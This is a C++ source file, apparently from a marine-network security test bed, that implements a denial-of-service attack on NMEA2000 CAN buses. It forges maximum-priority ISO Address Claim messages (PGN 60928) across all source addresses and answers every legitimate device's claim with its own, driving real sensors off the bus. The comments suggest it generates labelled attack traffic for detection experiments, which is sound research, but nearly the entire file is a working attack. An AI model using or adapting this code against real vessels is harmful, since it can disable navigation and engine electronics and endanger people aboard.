/**
 * @file Attack_Spam.cpp
 * @brief Spam/DOS attack implementation for Attack_Controller
 *
 * This file implements the ISO Address Claim spam attack, which demonstrates
 * a Denial of Service (DOS) vulnerability in NMEA2000 networks by exploiting
 * the ISO 11783 address arbitration mechanism.
 */

#include "Attack_Controller.h"
#include <Sensor.h>

/**
 * @brief Builds a high-priority NAME for address arbitration
 *
 * Constructs a 64-bit ISO NAME with the lowest possible value (highest priority)
 * to win address arbitration against legitimate devices. In NMEA2000/ISO 11783,
 * lower NAME values have higher priority during address conflicts.
 *
 * @return uint64_t The constructed high-priority NAME value
 * 
 * NAME field breakdown:
 * - Bits 0-20: Unique Number (set to 0 for lowest value)
 * - Bits 21-31: Manufacturer Code (set to 0)
 * - Bits 32-34: Device Instance (set to 0)
 * - Bits 35-42: Device Function (130 = Temperature)
 * - Bits 43-49: Device Class (75 = Sensor Communication)
 * - Bits 50-53: System Instance (set to 0)
 * - Bits 54-56: Industry Group (4 = Marine)
 * - Bit 57: Self-configurable (1 = yes)
 */
uint64_t Attack_Controller::buildHighPriorityName() {
    // Build a NAME with very low value (high priority) to win address arbitration
    // Lower NAME value = higher priority in NMEA2000/ISO 11783
    uint64_t name = 0;
    name |= ((uint64_t)0);                          // Unique number: 0 (lowest possible)
    name |= ((uint64_t)0 << 21);                    // Manufacturer code: 0 (lowest)
    name |= ((uint64_t)0 << 32);                    // Device instance: 0
    name |= ((uint64_t)130 << 35);                  // Device function: Temperature
    name |= ((uint64_t)75 << 43);                   // Device class: Sensor Communication
    name |= ((uint64_t)0 << 50);                    // System instance: 0
    name |= ((uint64_t)4 << 54);                    // Industry group: Marine
    name |= ((uint64_t)1 << 57);                    // Self-configurable: yes
    return name;
}

/**
 * @brief Checks if a source address belongs to our own device
 *
 * Compares a source address against all registered device addresses on this
 * controller to avoid attacking our own sensors.
 *
 * @param source The source address to check
 * @return true if the address belongs to one of our registered devices
 * @return false if the address is from an external device
 */
bool Attack_Controller::isOwnSource(uint8_t source) {
    // Check if source matches any of our registered device addresses
    // GetN2kSource() returns the current source address for each device index
    int deviceCount = 3;  // 3 registered devices (sensors)
    for (int i = 0; i < deviceCount; i++) {
        if (nmea2000_can1->GetN2kSource(i) == source) {
            return true;
        }
    }
    return false;
}

/**
 * @brief Sends a high-priority ISO Address Claim for a target address
 *
 * Transmits an ISO Address Claim message (PGN 60928) with our high-priority
 * NAME to claim a specific address. Uses priority 0 (highest) to ensure
 * the claim is processed before lower-priority traffic.
 *
 * @param targetAddress The address to claim (0-252)
 */
void Attack_Controller::sendHighPriorityAddressClaim(uint8_t targetAddress) {
    // Never emit a source address outside the legal CAN bus range (0-251).
    // The NMEA2000 library would silently drop SA > 251 for most PGNs; even
    // though it makes an exception for ISO Address Claim, we enforce the
    // range here so the flood's behaviour is well-defined and documented.
    if (targetAddress > SPAM_MAX_ADDRESS) return;

    tN2kMsg claimMsg;

    // Use library function to set up the ISO Address Claim message
    SetN2kPGN60928(claimMsg, attackerName);

    // Override priority and source for our attack
    claimMsg.Priority = 0;  // Highest priority
    claimMsg.Source = targetAddress;

    // SendMsg returns false if the driver TX buffer is full; count only
    // frames actually accepted by the driver so ground-truth totals are real.
    if (nmea2000_can1->SendMsg(claimMsg, -1)) {
        spamMessageCount++;
    }
}

/**
 * @brief Starts the spam/DOS attack
 *
 * Initiates the address takeover attack by:
 * 1. Stopping any active impersonate attack (single attack at a time)
 * 2. Building the high-priority attacker NAME
 * 3. Sending initial address claims for addresses 1-252
 * 4. Enabling reactive mode to respond to future address claims
 */
void Attack_Controller::startSpamAttack(uint32_t rateFps) {
    // Stop any existing impersonate attack first (enforce single attack at a time)
    if (impersonateActive) {
        stopImpersonate();
    }

    // Clamp the requested rate into [1, SPAM_MAX_RATE_FPS]. A rate of 0 would
    // mean "never send", which defeats the purpose of the positive control.
    if (rateFps == 0) rateFps = SPAM_DEFAULT_RATE_FPS;
    if (rateFps > SPAM_MAX_RATE_FPS) rateFps = SPAM_MAX_RATE_FPS;
    spamRateFps = rateFps;

    spamAttackActive = true;
    spamMessageCount = 0;
    currentSpamAddress = 0;
    spamStartMs = millis();
    lastSpamTime = spamStartMs;  // pacing anchor

    // Build our high-priority NAME once at start
    attackerName = buildHighPriorityName();

    // Clear any previously claimed addresses
    claimedAddresses.clear();

    // DEFECT D25 FIX: the flood is now driven proactively from updateSpam(),
    // called every main-loop iteration via Attack_Controller::update(). The
    // old blocking prime loop (for i in 1..252 { send; delay(10); }) was
    // commented out in the first release, which left the "spam" attack with
    // no proactive transmit path at all -- it only ever replied reactively in
    // attackHandler() to inbound claims, so on a quiet bench bus it sent
    // nothing. We no longer prime with a blocking loop (delay() would stall
    // the serial/menu loop); updateSpam() starts transmitting on the very
    // next loop iteration instead.

    // Ground truth for the campaign runner: emit a JSON start event on serial
    // with a millis timestamp so bus-off and injection windows can be aligned.
    char evt[160];
    snprintf(evt, sizeof(evt),
             "{\"evt\":\"attack\",\"type\":\"spam\",\"state\":\"start\","
             "\"t_ms\":%lu,\"rate_fps\":%lu,\"sa_lo\":0,\"sa_hi\":%u}",
             (unsigned long)spamStartMs, (unsigned long)spamRateFps,
             (unsigned)SPAM_MAX_ADDRESS);
    Serial.println(evt);
}

/**
 * @brief Stops the spam/DOS attack
 *
 * Terminates the attack and attempts to restore normal network operation by:
 * 1. Clearing the claimed addresses set
 * 2. Re-sending address claims for our legitimate sensors
 *
 * @note After stopping, the network should gradually recover as legitimate
 * devices reclaim their addresses through normal arbitration.
 */
void Attack_Controller::stopSpamAttack() {
    unsigned long stopMs = millis();
    unsigned long frames = spamMessageCount;
    unsigned long durMs = (spamStartMs != 0) ? (stopMs - spamStartMs) : 0;

    // Stop the proactive flood first so updateSpam() emits nothing more.
    spamAttackActive = false;

    // Clear claimed addresses
    claimedAddresses.clear();

    // Re-send address claims for our actual 3 sensors to restore normal operation.
    // This reclaims the injector's own addresses after the flood; once
    // isAttackActive() is false the main loop also resumes normal periodic
    // sensor transmit on the next UPDATE_INTERVAL tick.
    nmea2000_can1->SendIsoAddressClaim(0xff, 0, 0);  // Sensor 1
    nmea2000_can1->SendIsoAddressClaim(0xff, 1, 0);  // Sensor 2
    nmea2000_can1->SendIsoAddressClaim(0xff, 2, 0);  // Sensor 3

    // Ground truth for the campaign runner: emit a JSON stop event on serial
    // with timestamp, total frames actually sent, and the flood duration.
    char evt[176];
    snprintf(evt, sizeof(evt),
             "{\"evt\":\"attack\",\"type\":\"spam\",\"state\":\"stop\","
             "\"t_ms\":%lu,\"frames\":%lu,\"dur_ms\":%lu}",
             (unsigned long)stopMs, frames, durMs);
    Serial.println(evt);
}

/**
 * @brief Proactively transmits the ISO Address-Claim flood at a bounded rate.
 *
 * Driven from Attack_Controller::update() every main-loop iteration while the
 * spam attack is active. Uses millis()-based pacing to emit spamRateFps
 * frames/second, cycling the claimed source address through 0..SPAM_MAX_ADDRESS
 * (never > 251). At most SPAM_MAX_FRAMES_PER_UPDATE frames are sent per call so
 * a long main-loop stall cannot produce an unbounded catch-up burst and the
 * serial/menu loop stays responsive.
 */
void Attack_Controller::updateSpam() {
    if (!spamAttackActive) return;

    unsigned long now = millis();
    if (lastSpamTime == 0) lastSpamTime = now;

    unsigned long elapsed = now - lastSpamTime;
    if (elapsed == 0) return;

    // Frames owed since the pacing anchor: elapsed(ms) * rate(fps) / 1000.
    uint32_t framesDue = (uint32_t)((elapsed * (unsigned long)spamRateFps) / 1000UL);
    if (framesDue == 0) return;  // not yet time for the next frame

    // Burst cap: keep the main loop responsive even after a stall.
    if (framesDue > SPAM_MAX_FRAMES_PER_UPDATE) framesDue = SPAM_MAX_FRAMES_PER_UPDATE;

    for (uint32_t i = 0; i < framesDue; i++) {
        sendHighPriorityAddressClaim(currentSpamAddress);
        if (currentSpamAddress >= SPAM_MAX_ADDRESS) {
            currentSpamAddress = 0;      // wrap, never exceed 251
        } else {
            currentSpamAddress++;
        }
    }

    // Advance the pacing anchor by exactly the time represented by the frames
    // we just sent (not to `now`), so fractional-millis remainder is preserved
    // and the average rate stays accurate without drift.
    lastSpamTime += (unsigned long)(((unsigned long)framesDue * 1000UL) / (unsigned long)spamRateFps);
}

/**
 * @brief Handles incoming messages during active spam attack
 *
 * Monitors the CAN bus for ISO Address Claim messages (PGN 60928) from
 * other devices and responds with our own high-priority claim to maintain
 * address dominance.
 *
 * @param N2kMsg The incoming NMEA2000 message to process
 */
void Attack_Controller::attackHandler(const tN2kMsg &N2kMsg) {
    // Only respond during active spam attack
    if (!spamAttackActive) return;

    // This means that this is our device lmao
    if(N2kMsg.Priority == 0 && N2kMsg.PGN == 60928L) return;

    if(N2kMsg.PGN == 60928L){
#if DEBUG
        Serial.println(N2kMsg.Source);
#endif
        sendHighPriorityAddressClaim(N2kMsg.Source);
    }

}
